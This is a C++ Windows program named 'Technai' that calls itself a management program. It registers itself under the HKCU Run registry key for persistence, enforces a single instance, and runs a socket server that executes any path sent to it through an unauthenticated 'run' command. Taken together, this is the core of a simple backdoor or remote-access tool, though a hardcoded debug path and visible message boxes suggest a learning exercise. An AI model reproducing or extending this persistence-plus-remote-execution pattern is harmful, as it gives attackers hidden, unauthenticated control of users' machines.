#include "Main.h"
#include <vcruntime.h>
#include <vector>

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")



constexpr char MUTEX_NAME[] = "technai_mutex";
constexpr char RUN_REG[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
constexpr WCHAR PROGRAM_NAME[] = L"Technai";
constexpr WCHAR PROGRAM_PATH[] = L"C:\\Users\\User\\source\\repos\\twin\\x64\\Debug\\twin.exe";
constexpr char DEFAULT_MSG[] = "MANAGMENT PROGRAM IS UP";
constexpr char DEFAULT_TITLE[] = "MANAGMENT PROGRAM";


constexpr char ERROR_MSG[] = "Unknown Command";
constexpr char INVALID_ARGS_MSG[] = "Invalid Args";
constexpr char PING_COMMAND[] = "ping";
constexpr char PONG_COMMAND[] = "pong";
constexpr char RUN_COMMAND[] = "run";
constexpr char OK_COMMAND[] = "ok";

constexpr DWORD SLEEP_TIME = 1 * 1000 * 60 * 60;


WinapiException::WinapiException(const char* lastFunc, WinapiErrornoMethod error) : m_lastFunc(lastFunc) {
    switch (error) {
    case WinapiErrornoMethod::standardError:
        m_errorno = GetLastError();
        break;
    case WinapiErrornoMethod::wsaError:
        m_errorno = WSAGetLastError();
        break;
    default:
        m_errorno = 0;
        break;
    }
}

WinapiException::WinapiException(const char* lastFunc, int errorno) : m_lastFunc(lastFunc), m_errorno(errorno) {
    // blank
}


int WinapiException::getErrorno() {
    return m_errorno;
}

const char* WinapiException::getLastFunc() {
    return m_lastFunc;
}



Mutex ensureOneProgram() {
    // ensure that there is only one program running and return a locked mutex. mutex object must be freed
    Mutex mutex(MUTEX_NAME);

    DWORD waitStatus = WaitForSingleObject(mutex.getHandle(), 0);
    if (waitStatus == WAIT_OBJECT_0 || waitStatus == WAIT_ABANDONED) {
        return mutex;
    } else if (waitStatus == WAIT_TIMEOUT) {
        std::cout << "program is already running...\n";
        exit(1);
    } else if (waitStatus == WAIT_FAILED){
        throw WinapiException("WaitForSingleObject", WinapiErrornoMethod::standardError);
    } else {
        std::cout << "Unknown error\n";
        exit(1);
    }
}

void runOnStartUp() {
    HKEY hkey;

    LSTATUS status = RegCreateKeyA(HKEY_CURRENT_USER, RUN_REG, &hkey);

    if (status != ERROR_SUCCESS) {
        throw WinapiException("RegCreateKeyA", status);
    }

    status = RegSetKeyValueW(
        hkey,
        NULL,
        PROGRAM_NAME, 
        REG_SZ, 
        PROGRAM_PATH,
                        static_cast<DWORD>(wcslen(PROGRAM_PATH)) * sizeof(wchar_t) +
                            1 // including the null terminator as needed
                              // according to the doc of the function
    );
    RegCloseKey(hkey);
    if (status != ERROR_SUCCESS) {
        throw WinapiException("RegSetKeyValueW", status);
    }
}

void openMessageBox(const char* msg = DEFAULT_MSG,
                    const char* title = DEFAULT_TITLE) {
    int msgbox = MessageBoxA(NULL, msg, title, MB_OK);
    if (msgbox == NULL) {
        throw WinapiException("MessageBoxA", WinapiErrornoMethod::standardError);
    }
}

std::pair<std::string, std::vector<std::string>> parseCommand(std::string msg) {
    std::vector<std::string> splitted;
    size_t pos = 0;
    while ((pos = msg.find(' ')) != std::string::npos) {
        std::string token = msg.substr(0, pos);
        if (!token.empty()) {
            splitted.push_back(token);
        }
        msg.erase(0, pos + 1);
    }
    if (!msg.empty()) {
        splitted.push_back(msg);
    }
    if (splitted.empty()) {
        throw ClientException::invalidMsg;
    }
    std::string command = splitted[0];
    splitted.erase(splitted.begin());
    return {command, splitted};
}

std::string join(const std::vector<std::string>& vec, const std::string& delimiter) {
    std::string result;
    for (size_t i = 0; i < vec.size(); ++i) {
        result += vec[i];
        if (i < vec.size() - 1) {
            result += delimiter;
        }
    }
    return result;
}

void runPath(std::string path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    char* cpath = new char[path.length() + 1];
    strcpy_s(cpath, path.length()+1, path.c_str());
    BOOL suc = CreateProcessA(NULL,  // module name 
                   cpath, // Command line
                   NULL,  // Process handle not inheritable
                   NULL,  // Thread handle not inheritable
                   FALSE, // Set handle inheritance to FALSE
                   0,     // No creation flags
                   NULL,  // Use parent's environment block
                   NULL,  // Use parent's starting directory
                   &si,   // Pointer to STARTUPINFO structure
                   &pi    // Pointer to PROCESS_INFORMATION structure
    );
    delete[] cpath;
    if (!suc) {
        throw WinapiException("CreateProcess",
                              WinapiErrornoMethod::standardError);
    }
    Handle hProcess(pi.hProcess);
    Handle hThread(pi.hThread);

    DWORD waitStatus = WaitForSingleObject(hProcess.getHandle(), INFINITE);
    if (waitStatus != WAIT_OBJECT_0) {
        throw WinapiException("WaitForSingleObject",
                              WinapiErrornoMethod::standardError);
    }
}

void handleMsg(ClientSocket& client, const std::string& msg) {
    openMessageBox(msg.c_str());
    auto p = parseCommand(msg);
    std::string command = p.first;
    auto args = p.second;
    if (command == PING_COMMAND) {
        client.sendMsg(PONG_COMMAND);
    } else if (command == RUN_COMMAND) {
        if (args.size() < 1) {
            throw ClientException::invalidArgs;
        }
        try {
            runPath(join(args, " "));
        }
        catch (WinapiException &e) {
            if (e.getErrorno() == 2) {
                throw ClientException::invalidArgs;
            }
            throw e;
        }
        client.sendMsg(OK_COMMAND);
    }
    else {
        throw ClientException::invalidMsg;
    }
}

void handleClient(ClientSocket& client) {
    BOOL client_connected = TRUE;
    while (client_connected) {
        try {
            std::string msg = client.recvMsg();
            handleMsg(client, msg);
        }
        catch (ClientException e) {
            switch (e) {
            case ClientException::invalidMsg:
                client.sendMsg(ERROR_MSG);
                break;
            case ClientException::ClientDisconnected:
                client_connected = FALSE;
                break;
            case ClientException::invalidArgs:
                client.sendMsg(INVALID_ARGS_MSG);
                break;
            default:
                break;
            }
        }
    }
    
}

void startServer() {

    ServerSocket serverSock;
    serverSock.bind();
    serverSock.listen();
    while (TRUE) {
        ClientSocket client = serverSock.accept();
        handleClient(client);
    }
}

int main() {
    try {
        Mutex mutex = ensureOneProgram();
        runOnStartUp();
        //openMessageBox();
        startServer();
    } catch (WinapiException& e) {
        std::cout << "error number " << e.getErrorno() << " in "
                  << e.getLastFunc() << "\n";
    } catch (const std::exception& e) {
        std::cout << "Unknown exception: " << e.what() << "\n";
    } catch (...) {
        std::cout << "Unknown exception\n";
    }

    WSACleanup();
}

